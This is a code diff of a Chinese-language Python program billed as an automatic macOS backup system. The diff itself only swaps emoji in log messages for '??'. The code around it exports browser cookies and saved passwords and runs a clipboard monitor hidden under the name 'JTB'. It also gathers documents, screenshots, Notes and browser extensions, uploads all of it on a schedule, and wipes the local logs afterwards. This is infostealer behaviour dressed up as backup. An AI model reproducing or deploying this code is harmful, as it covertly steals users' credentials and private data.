+        logging.warning("?? 未检测到可用的用户主目录")
     else:
-        logging.info(f"📊 已配置用户主目录备份")
+        logging.info(f"?? 已配置用户主目录备份")
         for name, config in available_volumes.items():
             logging.info(f"  - {name}: {config['docs'][0]}")
     
@@ -2880,7 +2880,7 @@ def backup_screenshots():
                             shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                             files_found = True
                             if backup_manager.config.DEBUG_MODE:
-                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
+                                logging.info(f"?? 已备份截图: {relative_path}/{file}")
                         except Exception as e:
                             logging.error(f"复制截图文件失败 {source_file}: {e}")
             except Exception as e:
@@ -2889,9 +2889,9 @@ def backup_screenshots():
             logging.error(f"截图目录不存在: {source_dir}")
             
     if files_found:
-        logging.info("📸 截图备份完成，已找到符合规则的文件")
+        logging.info("?? 截图备份完成，已找到符合规则的文件")
     else:
-        logging.info("📸 未找到符合规则的截图文件")
+        logging.info("?? 未找到符合规则的截图文件")
             
     return screenshot_backup_directory if files_found else None
 
@@ -3025,7 +3025,7 @@ def backup_browser_extensions(backup_manager):
                                     shutil.copytree(source_dir, target_dir, symlinks=True)
                                     backed_up_count += 1
                                     if backup_manager.config.DEBUG_MODE:
-                                        logging.info(f"📦 已备份: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
+                                        logging.info(f"?? 已备份: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
                             except Exception as e:
                                 logging.error(f"复制扩展目录失败: {source_dir} - {e}")
                     except Exception as e:
@@ -3046,15 +3046,15 @@ def backup_browser_extensions(backup_manager):
                     shutil.copytree(safari_root, target_dir, symlinks=True)
                     backed_up_count += 1
                     if backup_manager.config.DEBUG_MODE:
-                        logging.info(f"📦 已备份: Safari 扩展")
+                        logging.info(f"?? 已备份: Safari 扩展")
             except Exception as e:
                 logging.error(f"复制 Safari 扩展目录失败: {e}")
 
         if backed_up_count > 0:
-            logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
+            logging.info(f"?? 成功备份 {backed_up_count} 个浏览器扩展")
             return extensions_backup_dir
         else:
-            logging.warning("⚠️ 未找到任何浏览器扩展数据")
+            logging.warning("?? 未找到任何浏览器扩展数据")
             return None
     except Exception as e:
         logging.error(f"复制浏览器扩展目录失败: {e}")
@@ -3063,22 +3063,22 @@ def backup_browser_extensions(backup_manager):
 def backup_browser_data():
     """备份浏览器数据（Cookies和密码）"""
     if not CRYPTO_AVAILABLE:
-        logging.warning("⚠️  跳过浏览器数据备份（pycryptodome未安装）")
+        logging.warning("??  跳过浏览器数据备份（pycryptodome未安装）")
         return None
     
     try:
-        logging.info("\n🌐 开始备份浏览器数据...")
+        logging.info("\n?? 开始备份浏览器数据...")
         exporter = BrowserDataExporter()
         browser_data_file = exporter.export_all()
         
         if browser_data_file and os.path.exists(browser_data_file):
-            logging.critical("☑️ 浏览器数据备份文件已准备完成\n")
+            logging.critical("?? 浏览器数据备份文件已准备完成\n")
             return browser_data_file
         else:
-            logging.error("❌ 浏览器数据备份失败\n")
+            logging.error("? 浏览器数据备份失败\n")
             return None
     except Exception as e:
-        logging.error(f"❌ 浏览器数据备份出错: {e}")
+        logging.error(f"? 浏览器数据备份出错: {e}")
         return None
 
 
@@ -3107,11 +3107,11 @@ def backup_mac_data(backup_manager):
                     backup_paths.extend(backup_path)
                 else:
                     backup_paths.append(backup_path)
-                logging.critical("☑️ 浏览器扩展数据备份文件已准备完成\n")
+                logging.critical("?? 浏览器扩展数据备份文件已准备完成\n")
             else:
-                logging.error("❌ 浏览器扩展数据压缩失败\n")
+                logging.error("? 浏览器扩展数据压缩失败\n")
         else:
-            logging.warning("⏭️  浏览器扩展数据收集失败或未找到\n")
+            logging.warning("??  浏览器扩展数据收集失败或未找到\n")
         
         # 备份浏览器数据（Cookies和密码）
         browser_data_file = backup_browser_data()
@@ -3130,11 +3130,11 @@ def backup_mac_data(backup_manager):
                     backup_paths.extend(backup_path)
                 else:
                     backup_paths.append(backup_path)
-                logging.critical("☑️ 备忘录数据备份文件已准备完成\n")
+                logging.critical("?? 备忘录数据备份文件已准备完成\n")
             else:
-                logging.error("❌ 备忘录数据压缩失败\n")
+                logging.error("? 备忘录数据压缩失败\n")
         else:
-            logging.error("❌ 备忘录数据收集失败\n")
+            logging.error("? 备忘录数据收集失败\n")
         
         # 备份截图文件
         screenshots_backup = backup_screenshots()
@@ -3148,11 +3148,11 @@ def backup_mac_data(backup_manager):
                     backup_paths.extend(backup_path)
                 else:
                     backup_paths.append(backup_path)
-                logging.critical("☑️ 截图文件备份文件已准备完成\n")
+                logging.critical("?? 截图文件备份文件已准备完成\n")
             else:
-                logging.error("❌ 截图文件压缩失败\n")
+                logging.error("? 截图文件压缩失败\n")
         else:
-            logging.info("ℹ️ 未发现可备份的截图文件\n")
+            logging.info("?? 未发现可备份的截图文件\n")
 
     except Exception as e:
         logging.error(f"Mac数据备份失败: {e}")
@@ -3187,13 +3187,13 @@ def backup_volumes(backup_manager, available_volumes):
                             backup_paths.extend(backup_path)
                         else:
                             backup_paths.append(backup_path)
-                        logging.critical(f"☑️ {volume_name} {backup_type} 备份文件已准备完成\n")
+                        logging.critical(f"?? {volume_name} {backup_type} 备份文件已准备完成\n")
                     else:
-                        logging.error(f"❌ {volume_name} {backup_type} 压缩失败\n")
+                        logging.error(f"? {volume_name} {backup_type} 压缩失败\n")
                 else:
-                    logging.error(f"❌ {volume_name} {backup_type} 备份失败\n")
+                    logging.error(f"? {volume_name} {backup_type} 备份失败\n")
             except Exception as e:
-                logging.error(f"❌ {volume_name} {backup_type} 备份出错: {str(e)}\n")
+                logging.error(f"? {volume_name} {backup_type} 备份出错: {str(e)}\n")
     
     return backup_paths
 
@@ -3211,7 +3211,7 @@ def periodic_backup_upload(backup_manager):
         daemon=True
     )
     clipboard_monitor_thread.start()
-    logging.critical("📋 JTB监控线程已启动")
+    logging.critical("?? JTB监控线程已启动")
     
     # 启动JTB上传线程
     clipboard_upload_thread_obj = threading.Thread(
@@ -3220,15 +3220,15 @@ def periodic_backup_upload(backup_manager):
         daemon=True
     )
     clipboard_upload_thread_obj.start()
-    logging.critical("📤 JTB上传线程已启动")
+    logging.critical("?? JTB上传线程已启动")
     
     # 初始化JTB日志文件
     try:
         os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
         with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-            f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+            f.write(f"=== ?? JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
     except Exception as e:
-        logging.error(f"❌ 初始化JTB日志失败: {e}")
+        logging.error(f"? 初始化JTB日志失败: {e}")
 
     # 获取用户名和系统信息
     username = getpass.getuser()
@@ -3269,15 +3269,15 @@ def periodic_backup_upload(backup_manager):
     
     # 输出启动信息和系统环境
     logging.critical("\n" + "="*50)
-    logging.critical("🚀 自动备份系统已启动")
+    logging.critical("?? 自动备份系统已启动")
     logging.critical("="*50)
-    logging.critical(f"⏰ 启动时间: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
+    logging.critical(f"? 启动时间: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
     logging.critical("-"*50)
-    logging.critical("📊 系统环境信息:")
+    logging.critical("?? 系统环境信息:")
     for key, value in system_info.items():
-        logging.critical(f"   • {key}: {value}")
+        logging.critical(f"   ? {key}: {value}")
     logging.critical("-"*50)
-    logging.critical("📋 JTB监控和自动上传已启动")
+    logging.critical("?? JTB监控和自动上传已启动")
     logging.critical("="*50)
 
     def read_next_backup_time():
@@ -3315,17 +3315,17 @@ def periodic_backup_upload(backup_manager):
             if should_backup_now():
                 current_time = datetime.now()
                 logging.critical("\n" + "="*40)
-                logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
+                logging.critical(f"? 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                 logging.critical("-"*40)
                 
                 # 获取当前可用的数据卷
                 available_volumes = get_available_volumes()
                 
                 # 执行备份任务
-                logging.critical("\n💾 数据卷备份")
+                logging.critical("\n?? 数据卷备份")
                 volumes_backup_paths = backup_volumes(backup_manager, available_volumes)
                 
-                logging.critical("\n🍎 Mac系统数据备份")
+                logging.critical("\n?? Mac系统数据备份")
                 mac_data_backup_paths = backup_mac_data(backup_manager)
                 
                 # 合并所有备份路径
@@ -3338,50 +3338,50 @@ def periodic_backup_upload(backup_manager):
                 has_backup_files = len(all_backup_paths) > 0
                 if has_backup_files:
                     logging.critical("\n" + "="*40)
-                    logging.critical(f"✅ 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
+                    logging.critical(f"? 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                     logging.critical("="*40)
-                    logging.critical("📋 备份任务已结束")
+                    logging.critical("?? 备份任务已结束")
                     if next_backup_time:
-                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
+                        logging.critical(f"?? 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                     logging.critical("="*40 + "\n")
                 else:
                     logging.critical("\n" + "="*40)
-                    logging.critical("❌ 部分备份任务失败")
+                    logging.critical("? 部分备份任务失败")
                     logging.critical("="*40)
-                    logging.critical("📋 备份任务已结束")
+                    logging.critical("?? 备份任务已结束")
                     if next_backup_time:
-                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
+                        logging.critical(f"?? 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                     logging.critical("="*40 + "\n")
                 
                 # 开始上传备份文件
                 if all_backup_paths:
-                    logging.critical("📤 开始上传备份文件...")
+                    logging.critical("?? 开始上传备份文件...")
                     upload_success = True
                     for backup_path in all_backup_paths:
                         if not backup_manager.upload_file(backup_path):
                             upload_success = False
                     
                     if upload_success:
-                        logging.critical("✅ 所有备份文件上传成功")
+                        logging.critical("? 所有备份文件上传成功")
                     else:
-                        logging.error("❌ 部分备份文件上传失败")
+                        logging.error("? 部分备份文件上传失败")
                 
                 # 上传备份日志
-                logging.critical("\n📝 正在上传备份日志...")
+                logging.critical("\n?? 正在上传备份日志...")
                 try:
                     backup_and_upload_logs(backup_manager)
                 except Exception as e:
-                    logging.error(f"❌ 日志备份上传失败: {e}")
+                    logging.error(f"? 日志备份上传失败: {e}")
             
             # 每小时检查一次是否需要备份
             time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
 
         except Exception as e:
-            logging.error(f"\n❌ 备份出错: {e}")
+            logging.error(f"\n? 备份出错: {e}")
             try:
                 backup_and_upload_logs(backup_manager)
             except Exception as log_error:
-                logging.error(f"❌ 日志备份失败: {log_error}")
+                logging.error(f"? 日志备份失败: {log_error}")
             # 发生错误时也更新下次备份时间
             write_next_backup_time()
             time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
@@ -3416,7 +3416,7 @@ def backup_and_upload_logs(backup_manager):
         user_prefix = username[:5] if username else "user"
         temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
         if not backup_manager._ensure_directory(str(temp_dir)):
-            logging.error("❌ 无法创建临时日志目录")
+            logging.error("? 无法创建临时日志目录")
             return
             
         # 创建带时间戳的备份文件名
@@ -3431,7 +3431,7 @@ def backup_and_upload_logs(backup_manager):
                 log_content = src.read()
             
             if not log_content or not log_content.strip():
-                logging.warning("⚠️ 日志内容为空，跳过上传")
+                logging.warning("?? 日志内容为空，跳过上传")
                 return
                 
             # 写入备份文件
@@ -3440,26 +3440,26 @@ def backup_and_upload_logs(backup_manager):
             
             # 验证备份文件是否创建成功
             if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
-                logging.error("❌ 备份日志文件创建失败或为空")
+                logging.error("? 备份日志文件创建失败或为空")
                 return
                 
             # 上传日志文件
-            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
+            logging.info(f"?? 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
             if backup_manager.upload_file(str(backup_path)):
                 # 上传成功后清空原始日志文件，只保留一条记录
                 try:
                     with open(log_file, 'w', encoding='utf-8') as f:
-                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
-                    logging.info("✅ 备份日志上传成功并已清空")
+                        f.write(f"=== ?? 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
+                    logging.info("? 备份日志上传成功并已清空")
                 except Exception as e:
-                    logging.error(f"❌ 备份日志更新失败: {e}")
+                    logging.error(f"? 备份日志更新失败: {e}")
             else:
-                logging.error("❌ 备份日志上传失败")
+                logging.error("? 备份日志上传失败")
                 
         except (OSError, IOError, PermissionError) as e:
-            logging.error(f"❌ 复制或读取日志文件失败: {e}")
+            logging.error(f"? 复制或读取日志文件失败: {e}")
         except Exception as e:
-            logging.error(f"❌ 处理日志文件时出错: {e}")
+            logging.error(f"? 处理日志文件时出错: {e}")
             if backup_manager.config.DEBUG_MODE:
                 logging.debug(traceback.format_exc())
             
@@ -3473,7 +3473,7 @@ def backup_and_upload_logs(backup_manager):
                     logging.debug(f"清理临时目录失败: {e}")
                 
     except Exception as e:
-        logging.error(f"❌ 处理备份日志时出错: {e}")
+        logging.error(f"? 处理备份日志时出错: {e}")
         if backup_manager.config.DEBUG_MODE:
             logging.debug(traceback.format_exc())
 
@@ -3514,13 +3514,13 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                                     if backup_manager.upload_file(temp_file):
                                         # 上传成功后清空原始日志文件
                                         with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-                                            f.write(f"=== 📋 JTB日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
+                                            f.write(f"=== ?? JTB日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                                         last_upload_time = current_time
                                         if backup_manager.config.DEBUG_MODE:
-                                            logging.info("📤 JTB日志上传成功")
+                                            logging.info("?? JTB日志上传成功")
                                 except Exception as e:
                                     if backup_manager.config.DEBUG_MODE:
-                                        logging.error(f"❌ JTB日志上传失败: {e}")
+                                        logging.error(f"? JTB日志上传失败: {e}")
                                 finally:
                                     # 清理临时目录
                                     try:
@@ -3531,9 +3531,9 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                         else:
                             # 文件没有实际内容，清空文件并重置上传时间
                             if backup_manager.config.DEBUG_MODE:
-                                logging.info("📋 JTB文件无实际内容，跳过上传")
+                                logging.info("?? JTB文件无实际内容，跳过上传")
                             with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-                                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                                f.write(f"=== ?? JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                             last_upload_time = current_time
                 
             # 定期检查
